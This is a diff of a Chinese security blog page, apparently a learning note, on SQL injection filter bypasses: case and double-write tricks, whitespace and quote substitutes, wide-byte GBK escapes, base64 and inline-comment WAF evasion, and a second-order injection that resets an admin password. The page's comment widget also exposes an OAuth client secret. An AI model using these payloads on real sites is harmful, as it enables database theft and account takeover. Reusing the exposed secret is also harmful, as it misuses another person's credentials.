@@ -6,16 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://kur08a.github.io">
-  <title>Archives: 2022 | Kur08a&#39;s Blog</title>
+  <title>SQLI的绕过姿势 | Kur08a&#39;s Blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Kur08a&#39;s Blog">
-<meta property="og:url" content="https://kur08a.github.io/archives/2022/index.html">
+  <meta name="description" content="十种常用绕过姿势以及二次注入原理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLI的绕过姿势">
+<meta property="og:url" content="https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">
 <meta property="og:site_name" content="Kur08a&#39;s Blog">
+<meta property="og:description" content="十种常用绕过姿势以及二次注入原理。">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-26T14:23:48.000Z">
+<meta property="article:modified_time" content="2022-03-27T04:41:33.559Z">
 <meta property="article:author" content="kur08a">
+<meta property="article:tag" content="penetration ; Web vulnerability">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Kur08a&#39;s Blog" type="application/atom+xml">
@@ -187,41 +192,151 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-SQLI的绕过姿势" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="archive-article-date">
-        <time datetime="2022-03-26T14:23:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-26</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQLI的绕过姿势</a>
-	
+    <h1 class="article-title" itemprop="name">
+      SQLI的绕过姿势
     </h1>
   
 
 
-        <div class="article-info info-on-right">
-          
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="archive-article-date">
+        <time datetime="2022-03-26T14:23:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-26</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.2k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">4分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>十种常用绕过姿势以及二次注入原理。</p>
+<span id="more"></span>
+<h2 id="1、SQL注入的各种绕过姿势："><a href="#1、SQL注入的各种绕过姿势：" class="headerlink" title="1、SQL注入的各种绕过姿势："></a>1、SQL注入的各种绕过姿势：</h2><h3 id="①大小写绕过"><a href="#①大小写绕过" class="headerlink" title="①大小写绕过"></a>①大小写绕过</h3><h3 id="②过滤注释的绕过"><a href="#②过滤注释的绕过" class="headerlink" title="②过滤注释的绕过"></a>②过滤注释的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),&#x27;3</span><br><span class="line">?id=-1&#x27; union select 1,database(),3 or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="③双写绕过"><a href="#③双写绕过" class="headerlink" title="③双写绕过"></a>③双写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; aAndnD 1=1 --+</span><br><span class="line">也可在敏感词汇中添加注释，如：a/**/nd</span><br></pre></td></tr></table></figure>
+
+<h3 id="④关键字等价绕过"><a href="#④关键字等价绕过" class="headerlink" title="④关键字等价绕过"></a>④关键字等价绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了and和or，可用&amp;&amp;和||替代。</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑤过滤空格或单引号的绕过"><a href="#⑤过滤空格或单引号的绕过" class="headerlink" title="⑤过滤空格或单引号的绕过"></a>⑤过滤空格或单引号的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1、可替代空格使用的符号：</span><br><span class="line">%20  %09  %0a  %0b %0c %0d %a0 /**/     （首选%a0）</span><br><span class="line">%a0 #表示空格，MySQL 中%a0 代表空白符，可以代替空格。</span><br><span class="line"></span><br><span class="line">%26 #表示&amp;</span><br><span class="line">%27 #表示 &#x27; 单引号</span><br><span class="line"></span><br><span class="line">2、过滤单引号，使用编码行不通怎么办？</span><br><span class="line">使用\&#x27; or 1=1#</span><br><span class="line">\注释掉单引号， or 1=1可以换成构造的SQL语句，如union select。#注释掉后面的内容。</span><br><span class="line">例如：</span><br><span class="line">$sql = &quot;SELECT username, password FROM user WHERE username=&#x27;&quot; .$user .&quot;&#x27; &amp;&amp; password=&#x27;&quot; .$pass .&quot;&#x27;&quot;;</span><br><span class="line">要想闭合sql语句加上or 1=1#来使判断条件为真，使用\转义，用\转义后面的单引号。</span><br><span class="line">在用户名框输入\，密码框输入or 1=1 #，这样提交后，sql语句是这样的：</span><br><span class="line">...where username=&#x27;\&#x27;&amp;&amp; password=&#x27; or 1=1 #&#x27;</span><br><span class="line">这时实际上你提交的username就是\&#x27;&amp;&amp; password= </span><br><span class="line">提交的密码里的#把后面的多余的单引号给注释掉了，这个时候sql注入就成功了。</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑥过滤关键字的绕过"><a href="#⑥过滤关键字的绕过" class="headerlink" title="⑥过滤关键字的绕过"></a>⑥过滤关键字的绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. 大小写绕过</span><br><span class="line">b. 盲注绕过</span><br><span class="line">?id=1%27%a0and%a0if((length(database())=8),sleep(3),1)%a0and%a0%271</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑦宽字节（宽字符）绕过（addslashes-转义的-sql-注入）"><a href="#⑦宽字节（宽字符）绕过（addslashes-转义的-sql-注入）" class="headerlink" title="⑦宽字节（宽字符）绕过（addslashes()转义的 sql 注入）"></a>⑦宽字节（宽字符）绕过（addslashes()转义的 sql 注入）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">为了防止注入，开启了gpc。但数据库设置GBK(宽字节字符集)，就会产生漏洞。</span><br><span class="line">原理是GBK可以逃逸gpc，比如数据库编码与php编码不通</span><br><span class="line"></span><br><span class="line">?id=-1%df&#x27; union select 1,database(),user()--+</span><br><span class="line"></span><br><span class="line">【宽字符注入的必要条件，第一个字符的 ASCII 码必须大于 128。</span><br><span class="line">不一定要用%df，使用ASCII码（十进制）大于128的即可，如：</span><br><span class="line">129（十进制）转换为十六进制为0x81，在十六进制前加%即可。</span><br><span class="line">这取决于GBK字符集，ASCII码128以前(1-127)是常规字符，128以后是特殊字符。</span><br><span class="line">GBK首字节对应0x81-oxFE，尾字节对应0x40-0xFE（除0x7F）。】</span><br><span class="line">原理：</span><br><span class="line">&#x27; 或 \ 被 PHP 转义，单引号被加上反斜杠\，变成了\&#x27;</span><br><span class="line">\ 的十六进制是 %5C </span><br><span class="line">在注入时候可以加入%df，然后结果为%df\&#x27; </span><br><span class="line">换为 URL 编码则是 %df%5c%27</span><br><span class="line">如果程序的默认字符集是 GBK 等宽字节字符集，</span><br><span class="line">则 MySQL 用 GBK 的编码时，会认为 %df%5c 是一个宽字符，也就是運&#x27;，</span><br><span class="line">也就是说：%df\&#x27; = %df%5c%27= 運&#x27;，接下来单引号就可以起闭合作用了。</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑧Base64绕过（cookie注入等POST方式）"><a href="#⑧Base64绕过（cookie注入等POST方式）" class="headerlink" title="⑧Base64绕过（cookie注入等POST方式）"></a>⑧Base64绕过（cookie注入等POST方式）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编码后进行注入，这样gpc拦截不了，注入后，再执行程序解码拼接恶意语句注入查询。</span><br><span class="line"></span><br><span class="line">将我们设计好的 SQL 语句进行 base64 加密：</span><br><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br><span class="line">变成了：</span><br><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑨URL编码绕过"><a href="#⑨URL编码绕过" class="headerlink" title="⑨URL编码绕过"></a>⑨URL编码绕过</h3><h3 id="⑩内联注释绕过WAF（只有MySQL可以识别，SQL-server不能）"><a href="#⑩内联注释绕过WAF（只有MySQL可以识别，SQL-server不能）" class="headerlink" title="⑩内联注释绕过WAF（只有MySQL可以识别，SQL server不能）"></a>⑩内联注释绕过WAF（只有MySQL可以识别，SQL server不能）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*//*!select*/</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-、实现二次注入修改其他用户密码："><a href="#2-、实现二次注入修改其他用户密码：" class="headerlink" title="2 、实现二次注入修改其他用户密码："></a>2 、实现二次注入修改其他用户密码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">二次注入：</span><br><span class="line">二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</span><br><span class="line">二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。</span><br><span class="line">普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</span><br><span class="line">原理</span><br><span class="line">在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes </span><br><span class="line">或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义（添加了/），</span><br><span class="line">但是 / 并不会插入数据库，所以在存入数据库时还是原来的数据，</span><br><span class="line">数据中一般带有单引号和＃号，然后下次被读取后拼凑在了新的SQL查询语句中，所以就形成了二次注入。</span><br><span class="line">如下：</span><br><span class="line"></span><br><span class="line">1、新建用户 admin&#x27;-- +</span><br><span class="line">(用户名是我们设计的 payload)</span><br><span class="line">(我用admin&#x27;--+失败了？？？空格不能少)</span><br><span class="line"></span><br><span class="line">2、登录新用户重设密码</span><br><span class="line"></span><br><span class="line">3、修改成功，其实修改的是admin用户的密码。</span><br><span class="line">源码分析：</span><br><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and </span><br><span class="line">password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">我们将用户信息带入</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;123qwe&#x27; where username=&#x27;admin&#x27;-- +&#x27; and </span><br><span class="line">password=&#x27;123456&#x27;；</span><br><span class="line">最终执行</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;123qwe&#x27; where username=&#x27; admin&#x27;;</span><br><span class="line"></span><br><span class="line">总结：二次注入构建了一个能够被重复利用的 payload。</span><br></pre></td></tr></table></figure>
+
+    
+
+
+ <!-- 增加版权声明 -->
+ 
+ 
+ <div class="declare">
+   <strong>本文作者：</strong>
+   
+     kur08a
+   
+   <br>
+   <strong>本文链接：</strong>
+   <a rel="license" href="https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a>
+   <br>
+   <strong>版权声明：</strong>
+   本作品采用
+   <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>
+   进行许可。转载请注明出处！
+   
+     <br>
+     <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
+   
+ </div>
+    
+<!-- 增加版权声明 -->
+<!--  -->
+<!-- 增加版权声明结束 --> 
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/zfb.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/wx.jpg">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+  </div>
+  <div class="article-info article-info-index">
+    
+    <div class="article-pop-out tagcloud">
+      <i class="icon-tuding"></i>
+      <a class="article-tag-list-link color3">置顶</a>
+    </div>
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -233,193 +348,146 @@
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+  <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+  <p>扫一扫，分享到微信</p>
+  <div class="wx-qrcode">
+    <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kur08a.github.io/2022/03/26/SQLI%E7%9A%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" alt="微信分享二维码">
+  </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/26/infomation-gathering/" class="archive-article-date">
-        <time datetime="2022-03-26T14:06:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-26</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/26/infomation-gathering/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">infomation gathering</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2022/03/26/infomation-gathering/">infomation gathering</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">penetration</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">1、SQL注入的各种绕过姿势：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">①大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">②过滤注释的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">③双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3%E5%85%B3%E9%94%AE%E5%AD%97%E7%AD%89%E4%BB%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">④关键字等价绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A4%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%88%96%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">⑤过滤空格或单引号的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A5%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">⑥过滤关键字的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A6%E5%AE%BD%E5%AD%97%E8%8A%82%EF%BC%88%E5%AE%BD%E5%AD%97%E7%AC%A6%EF%BC%89%E7%BB%95%E8%BF%87%EF%BC%88addslashes-%E8%BD%AC%E4%B9%89%E7%9A%84-sql-%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">⑦宽字节（宽字符）绕过（addslashes()转义的 sql 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A7Base64%E7%BB%95%E8%BF%87%EF%BC%88cookie%E6%B3%A8%E5%85%A5%E7%AD%89POST%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-number">1.8.</span> <span class="toc-text">⑧Base64绕过（cookie注入等POST方式）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A8URL%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">⑨URL编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A9%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87WAF%EF%BC%88%E5%8F%AA%E6%9C%89MySQL%E5%8F%AF%E4%BB%A5%E8%AF%86%E5%88%AB%EF%BC%8CSQL-server%E4%B8%8D%E8%83%BD%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">⑩内联注释绕过WAF（只有MySQL可以识别，SQL server不能）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E3%80%81%E5%AE%9E%E7%8E%B0%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E4%BF%AE%E6%94%B9%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">2 、实现二次注入修改其他用户密码：</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--gitalk评论系统代码添加-->
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/20/hexo%E6%A8%A1%E6%9D%BFyilia%E5%A4%B4%E5%83%8F%E5%A2%9E%E5%8A%A0%E6%97%8B%E8%BD%AC%E6%95%88%E6%9E%9C/" class="archive-article-date">
-        <time datetime="2022-03-20T09:38:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-20</time>
-</a>
+<div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
 
-        </div>
-    	 
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+	var gitalk = new Gitalk({
+  	clientID: '148f0c84a8a85301fdb9',
+  	clientSecret: 'e92610d63406442ab9944b5bc1833fa6ab720285',
+  	repo: 'myhexocomments',
+  	owner: 'kur08a',
+  	admin: ['kur08a'],
+  	id: 'Sat Mar 26 2022 22:23:48 GMT+0800',
+  	distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2022/03/20/hexo%E6%A8%A1%E6%9D%BFyilia%E5%A4%B4%E5%83%8F%E5%A2%9E%E5%8A%A0%E6%97%8B%E8%BD%AC%E6%95%88%E6%9E%9C/">hexo模板yilia头像增加旋转效果</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/20/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E4%BD%BF%E7%94%A8hexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9Eblog/" class="archive-article-date">
-        <time datetime="2022-03-20T03:07:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-20</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2022/03/20/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E4%BD%BF%E7%94%A8hexo%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9Eblog/">手把手教你使用hexo框架搭建自己的专属blog</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/03/19/Markdown%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99%E6%A0%BC%E5%BC%8F/" class="archive-article-date">
-        <time datetime="2022-03-19T12:12:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-19</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2022/03/19/Markdown%E6%96%87%E6%A1%A3%E7%BC%96%E5%86%99%E6%A0%BC%E5%BC%8F/">Markdown文档编写格式</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">基础</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-
-
           </div>
         </div>
       </div>
@@ -458,8 +526,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
